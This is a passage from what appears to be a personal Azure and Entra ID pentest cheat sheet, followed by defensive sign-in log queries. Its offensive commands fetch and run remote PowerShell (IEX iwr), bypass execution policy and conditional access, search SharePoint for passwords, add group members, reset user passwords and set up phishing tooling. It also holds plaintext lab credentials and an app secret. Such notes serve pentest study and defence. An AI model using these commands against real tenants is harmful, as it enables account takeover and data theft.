python3 findmeaccess.py audit -u sunita.williams@megabigtech.com -p iN33d4Hol1d@y -c d3590ed6-52b3-4102-aeff-aad2292ab01c -r https://graph.microsoft.com

# remember to check the list of services above link, here we are using office.com to get the token
python3 findmeaccess.py token -u <username> -p <password> -c d3590ed6-52b3-4102-aeff-aad2292ab01c -r https://outlook.office365.com

# checking for azure access with management api
python3 findmeaccess.py token -u <username> -p <password> -c d3590ed6-52b3-4102-aeff-aad2292ab01c -r https://management.azure.com
```

### CheckPrivesc - PrivescCheck

https://github.com/itm4n/PrivescCheck

```powershell
# download and invoke
wget https://raw.githubusercontent.com/itm4n/PrivescCheck/master/PrivescCheck.ps1 -O PrivescCheck.ps1
. .\PrivescCheck.ps1
Invoke-PrivescCheck

# example usage
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
```

### ROADTools

[https://github.com/dirkjanm/ROADtools](https://github.com/dirkjanm/ROADtools)

```powershell
# authenticate and get the tokens
roadrecon auth -u matteus@megabigtech.com -p SUMMERDAZE1!

#use device code to auth
roadrecon auth --device-code

# gather info
roadrecon gather

# example list policies
roadrecon plugin policies

# getting tokens- token exchange for msgraph and teams
roadtx auth -u myuser@mytenant -p mypassword -c msteams -r msgraph

# extended with the api endpoint name
roadtx interactiveauth -c msteams -r https://graph.microsoft.com

roadrecon auth --as-app -c <client_id_from_app> -p <secret> -t <tenant>

# this is the example command from my lab, application and client id are the same 
roadrecon auth --as-app -c 5373069e-abcb-41e5-b933-8a81ada5ae37 -p "sZt8Q~NgRdFi1JlZ0C5jOxjENV1JuRO~2vpurc84" -t 7ee2f8e8-185b-45be-8fcf-c2a493cade1b

# spoof the user agent 
roadrecon gather --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"

# start the GUI
roadrecon gui
```

### GraphRunner

```powershell
# get the script in case you do not have it 
IEX (iwr 'https://raw.githubusercontent.com/dafthack/GraphRunner/main/GraphRunner.ps1')

# authenticate with the code flow
Get-GraphTokens

# use with a different device to bypass conditional access
Get-GraphTokens -Device AndroidMobile

#extract data from SharePoint and OneDrive
Invoke-SearchSharePointAndOneDrive -Tokens $tokens -SearchTerm password

# search for filetype
Invoke-SearchSharePointAndOneDrive -Tokens $tokens -SearchTerm 'filetype: txt'

# check groups
Get-SecurityGroups -Tokens $token

# add a new member to an entra ID security group
Get-UserObjectID -Tokens $tokens user.name@domain.com 
Invoke-AddGroupMember -group <group_id> -userId <user_id> -Tokens $tokens

# abuse access to dynamic groups
Get-DynamicGroups

```

### BARK

https://github.com/BloodHoundAD/BARK

```powershell
# import module
Import-Module ./BARK.ps1

# example usage
$RefreshToken = Get-EntraRefreshTokenWithUsernamePassword -username 'username' -password 'password' -TenantId 'tenant_id'

Set-EntraUserPassword -TargetUserID usern.name@domain.com -Token $RefreshToken.access_token -Password 'Password123'
```

## Phishing tools and resources

### CuddlePhish

https://github.com/fkasler/cuddlephish

```powershell
# build with docker and other dependencies
git clone https://github.com/fkasler/cuddlephish
cd cuddlephish
sudo bash install_deps.sh
```

### evilginx

```powershell

```

### gophish

```powershell

```

# powershell sdk beta

### enumerates **service principals - privesc**

**This script checks SPNs in the Entra ID directory that have roles** that could potentially lead to privilege escalation paths

```powershell
Get-MgBetaDirectoryRole | Foreach-Object {
    $Role = $_
    $Members = Get-MgBetaDirectoryRoleMember -directoryRoleId $Role.Id | Where-Object {
        $_.AdditionalProperties."@odata.type" -eq "#microsoft.graph.servicePrincipal"
    }
    
    if ($Members) {
        Write-Host $Role.DisplayName
        foreach ($Member in $Members) {
            $ServicePrincipal = Get-MgBetaServicePrincipal -ServicePrincipalId $Member.Id -ErrorAction SilentlyContinue
            if ($ServicePrincipal) {
                Write-Host "Member: $($ServicePrincipal.DisplayName) $($ServicePrincipal.AppId)"
            }
        }
    }
}
```

# Defensive notes and tools/scripts

```powershell
Install-Module Microsoft.Graph -AllowClobber
Connect-MgGraph -Scope AuditLog.Read.All
```

The `SignInActivity` property gives you the most recent interactive and non-interactive sign in.

```powershell
$user = Get-MgUser -UserId '7d0cfca3-b00e-424c-bf13-d7c2f0869901' -Property UserPrincipalName,SignInActivity
$user.SignInActivity  | fl
```

`Get-MgAuditLogSignIn`

```powershell
$startDate = (Get-Date).AddDays(-7).ToString("yyyy-MM-ddTHH:mm:ssZ")
$endDate = (Get-Date).ToString("yyyy-MM-ddTHH:mm:ssZ")
$signIns = Get-MgAuditLogSignIn -Filter "createdDateTime ge $startDate and createdDateTime le $endDate" -All
$failedSignIns = $signIns | Where-Object {
    ($_.Status.ErrorCode -eq 50076) -or ($_.Status.ErrorCode -eq 50158)
}

$userFailedSignInDetails = @{}
foreach ($signIn in $failedSignIns) {

    $userId = $signIn.UserPrincipalName
    $ipAddress = $signIn.IpAddress
    $signInTime = $signIn.CreatedDateTime
    $Application = $signIn.AppDisplayName

    $attemptKey = "$userId|$ipAddress|$signInTime|$Application"

    if ($userFailedSignInDetails.ContainsKey($userId)) {
        $userFailedSignInDetails[$userId] += @($attemptKey)
    } else {
        $userFailedSignInDetails[$userId] = @($attemptKey)
    }
}

foreach ($user in $userFailedSignInDetails.Keys) {
    Write-Output "User: $user"
    $attempts = $userFailedSignInDetails[$user] | Sort-Object -Unique
    Write-Output "Total Failed Sign-Ins: $($attempts.Count)"
    foreach ($attempt in $attempts) {
        $details = $attempt -split '\|'
        Write-Output "Time: $($details[2]), IP: $($details[1]), Service: $($details[3])"
    }
    Write-Output "---------------------------------------------"
}
```

Sentinel query to report on the most managed identities, to reveal any sus behavior

```bash
AADManagedIdentitySignInLogs
| where TimeGenerated > ago(7d)
| summarize CountPerManagedIdentity = count() by ServicePrincipalId
| order by CountPerManagedIdentity desc
| take 100
```

Get the logs from GraphRunner looking for graphtokens

```bash
SigninLogs
| where AuthenticationProtocol == "deviceCode"
| where ResourceDisplayName == "Microsoft Graph"
```

# Scripts and simple commands

```powershell
# clean the private key
echo -e "<paste_your_key_here>" | sed 's/\\n/\n/g' > private_key.pem
```

## Get all the sign in logs with MSGraph API

```powershell
# Install-Module Microsoft.Graph -Scope CurrentUser
Connect-MgGraph
$startDate = (Get-Date).AddDays(-7).ToString("yyyy-MM-ddTHH:mm:ssZ")
$endDate = (Get-Date).ToString("yyyy-MM-ddTHH:mm:ssZ")
$signIns = Get-MgAuditLogSignIn -Filter "createdDateTime ge $startDate and createdDateTime le $endDate" -All
$failedSignIns = $signIns | Where-Object {
   ($_.Status.ErrorCode -eq 50076) -or ($_.Status.ErrorCode -eq 50158)
}
$userFailedSignInDetails = @{}
foreach ($signIn in $failedSignIns) {
   $userId = $signIn.UserPrincipalName
   $ipAddress = $signIn.IpAddress
   $signInTime = $signIn.CreatedDateTime
   $Application = $signIn.AppDisplayName
   $attemptKey = "$userId|$ipAddress|$signInTime|$Application"
   if ($userFailedSignInDetails.ContainsKey($userId)) {
       $userFailedSignInDetails[$userId] += @($attemptKey)
   } else {
       $userFailedSignInDetails[$userId] = @($attemptKey)
   }
}
foreach ($user in $userFailedSignInDetails.Keys) {
   Write-Output "User: $user"
   $attempts = $userFailedSignInDetails[$user] | Sort-Object -Unique
   Write-Output "Total Failed Sign-Ins: $($attempts.Count)"
   foreach ($attempt in $attempts) {
       $details = $attempt -split '\|'
       Write-Output "Time: $($details[2]), IP: $($details[1]), Service: $($details[3])"
   }
   Write-Output "---------------------------------------------"
}
```

# Resources

## GitHub cheatsheet list

[https://github.com/andreipintica/Azure-PowerShell-CheatSheet](https://github.com/andreipintica/Azure-PowerShell-CheatSheet)